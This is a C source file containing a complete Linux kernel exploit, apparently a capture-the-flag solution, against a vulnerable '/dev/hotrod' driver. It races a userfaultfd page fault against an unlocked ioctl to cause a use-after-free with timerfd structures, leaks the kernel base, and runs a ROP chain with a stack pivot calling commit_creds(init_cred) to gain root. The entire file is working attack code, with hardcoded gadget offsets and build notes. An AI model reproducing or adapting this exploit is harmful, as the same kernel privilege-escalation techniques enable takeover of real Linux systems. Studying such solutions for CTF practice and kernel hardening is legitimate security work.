#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include<linux/userfaultfd.h>
#include <sys/timerfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/reboot.h>

#define ALLOC 0xBAADC0DE
#define EDIT 0xDEADC0DE
#define FREE 0xC001C0DE
#define SHOW 0x1337C0DE

#define TIMERFD_TMPROC_OFFSET 0x102a00
#define COMMIT_CREDS_OFFSET 0x537d0
#define INIT_CRED_OFFSET 0x837620
#define XCHG_EAX_ESP_OFFSET 0x89ff2
#define POP_RDI_OFFSET 0xb689d
#define KPTI_TRAMPOLINE_OFFSET  0x200cb0 + 0x16 // https://elixir.bootlin.com/linux/v5.8.3/source/arch/x86/entry/entry_64.S#L501, + 0x16 to skip regs

#define MOV_RAX_RDI_AND_RAX_OFFSET 0x17bab // mov rax, rdi ; and rax, 0xfffffffffffffff0 ; ret
#define POP_RCX_OFFSET 0x18a8d3
#define POP_R11_POP_R12_POP_RBP_OFFSET 0x8b7d

// gcc exploit.c -o exploit -static -pthread -masm=intel
// transfer with b64 + gzip

// dumped values from kernel module with printk because elixir showed them as layers of nested macros
#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_COPY 0xc028aa03

typedef struct
{
	unsigned long size;
	char *data;
}req_t;

static int fd;
static pthread_t thread;;
static unsigned long long leaks[0x100/8];
static unsigned long long kbase, timerfd_tmrproc, commit_creds, init_cred, xchg_eax_esp, pop_rdi, kpti_trampoline;
static unsigned long long addr;

// ioctl wrapper
int ioctl(int fd, unsigned long request, unsigned long param)
{
	return syscall(16, fd, request, param);
}

// helper functions
int alloc(int fd, unsigned long size) 
{
	return ioctl(fd, ALLOC, size);
}

int delete(int fd) 
{

	return ioctl(fd, FREE, 0);
}

int edit(int fd, unsigned long size, char *src) 
{
	req_t req;

	req.size = size;
	req.data = src;

	return ioctl(fd, EDIT, &req);
}

int show(int fd, unsigned long size, char *dest) 
{
	req_t req;

	req.size = size;
	req.data = dest;

	return ioctl(fd, SHOW, &req);
}

// function to return to once we become root
void pwned()
{
	int flag_fd;
	char flag[0x50];
	printf("uid: %d\n", getuid());
	flag_fd = open("/flag", O_RDONLY);
	read(flag_fd, flag, 0x50);
	puts(flag);
	close(flag_fd);
	reboot(RB_POWER_OFF);
}

// based on https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/krazynote.c
// based on https://smallkirby.hatenablog.com/entry/2020/08/09/085028#10-exploit

void *racer(void *arg)
{
	struct uffd_msg uf_msg;
	struct uffdio_copy uf_copy;
	long uffd = (long)arg;
	struct pollfd pollfd;
	int nready;

	pollfd.fd = uffd;
	pollfd.events = POLLIN;

	while(poll(&pollfd, 1, -1) > 0)
	{
		if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
		{
			perror("polling error");
			exit(-1);
		}
		// reading the event
		if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
		{
			perror("error reading event");
			exit(-1);
		}
		if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
		{
			perror("unexpected result from event");
			exit(-1);
		}
		puts("caught a race");
		puts("triggering a deletion");
		delete(fd);

		struct itimerspec timespec = {{10, 0}, {10, 0}};
		int tfd = timerfd_create(CLOCK_REALTIME, 0);
		timerfd_settime(tfd, 0, &timespec, 0);
		puts("allocated timerfd_ctx struct");

		// now copy over edit data
		char uf_buffer[0x1000];
		struct uffdio_copy uf_copy;

		leaks[5] = xchg_eax_esp;
		memset(uf_buffer, 0, sizeof(uf_buffer));
		memcpy(uf_buffer, &leaks, 0x30);

		uf_copy.src = uf_buffer;
		uf_copy.dst = addr;
		uf_copy.len = 0x1000;
		uf_copy.mode = 0;
		uf_copy.copy = 0;
		if(ioctl(uffd, UFFDIO_COPY, &uf_copy) == -1)
		{
			perror("uffdio_copy error");
			exit(-1);
		}
		puts("race successfully finished");
		while (1)
		{
			getchar();
		}
	 }
	return 0;
}

void register_userfault()
{
	int uffd, race;
	struct uffdio_api uf_api;
	struct uffdio_register uf_register;

	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	uf_api.api = UFFD_API;
	uf_api.features = 0;

	// creating userfaultfd for race condition because using unlocked_ioctl without locking mutexes
	if (ioctl(uffd, UFFDIO_API, &uf_api) == -1)
	{
		perror("error with the uffdio_api");
		exit(-1);
	}

	// page for userfaultfd
	if (mmap(addr, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != addr)
	{
		perror("whoopsie doopsie on mmap");
		exit(-1);
	}

	uf_register.range.start = addr;
	uf_register.range.len = 0x1000;
	uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

	// uffd will change when the kernel thread page faults here and hangs
	if (ioctl(uffd, UFFDIO_REGISTER, &uf_register) == -1)
	{
		perror("error registering page for userfaultfd");
	}

	race = pthread_create(&thread, NULL, racer, (void*)uffd);
	if(race != 0)
	{
		perror("can't setup threads for race");
	}
	return;
}

int main(int argc, char **argv)
{
	fd = open("/dev/hotrod", O_RDWR);
	if (fd < 0)
	{
		perror("failed opening device");
		exit(-1);
	}

	// spray to increase exploit reliability
	for (int i = 0; i < 0x100; i++)
	{
		struct itimerspec timespec = {{0, 0}, {100, 0}};
		int tfd = timerfd_create(CLOCK_REALTIME, 0);
		timerfd_settime(tfd, 0, &timespec, 0);
	}

	puts("finished initial spray");

	struct itimerspec timespec = {{10, 0}, {10, 0}};
	int tfd = timerfd_create(CLOCK_REALTIME, 0);
	// refer to https://rpis.ec/blog/tokyowesterns-2019-gnote/ usage of this for leaks
	timerfd_settime(tfd, 0, &timespec, 0);
	close(tfd);
	sleep(1);
	alloc(fd, 0xe0);

	//leaks
	show(fd, 0xe0, &leaks);
	timerfd_tmrproc = leaks[5];
	kbase = timerfd_tmrproc - TIMERFD_TMPROC_OFFSET;
	init_cred = kbase + INIT_CRED_OFFSET;
	commit_creds = kbase + COMMIT_CREDS_OFFSET;
	xchg_eax_esp = kbase + XCHG_EAX_ESP_OFFSET;
	pop_rdi = kbase + POP_RDI_OFFSET;
	kpti_trampoline = kbase + KPTI_TRAMPOLINE_OFFSET;

	printf("Kernel base: 0x%llx\n", kbase);
	printf("init_cred: 0x%llx\n", init_cred);
	printf("commit_creds: 0x%llx\n", commit_creds);
	printf("xchg_eax_esp: 0x%llx\n", xchg_eax_esp);
	printf("pop_rdi: 0x%llx\n", pop_rdi);
	printf("kpti_trampoline: 0x%llx\n", kpti_trampoline);

	// mmap page for rop chain
	unsigned long pivot_target = xchg_eax_esp & 0xffffffff;
	unsigned long *fake_stack = mmap(pivot_target & 0xfffff000, 0x50000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED|MAP_POPULATE, 0, 0);
	if (fake_stack == -1)
	{
		perror("fake stack mmap error");
		exit(-1);
	}

	// saving state
	unsigned long long user_rflags, user_cs, user_ss, user_sp;
	asm volatile(
		"mov %0, %%cs\n"
		"mov %1, %%ss\n"
		"mov %2, %%rsp\n"
		"pushfq\n"
		"pop %3\n"
		: "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
	);

	// rop chain to make me root and return to pwned
	unsigned long long rop[] = 
	{
		pop_rdi,
		init_cred,
		commit_creds,
		kpti_trampoline,
		0xdeadbabe,
		0xdeadbabe,
		(unsigned long)pwned,
		user_cs,
		user_rflags,
		user_sp,
		user_ss
	};

	memcpy((void *)pivot_target, rop, sizeof(rop));
	puts("finished writing rop chain to mmap'd page");

	// now trigger userfaultfd race
	addr = 0x10000;
	register_userfault();
	puts("finished registering userfaultfd page for race condition");
	puts("triggering userfaultfd");
	edit(fd, 0x30, addr);

	getchar();
}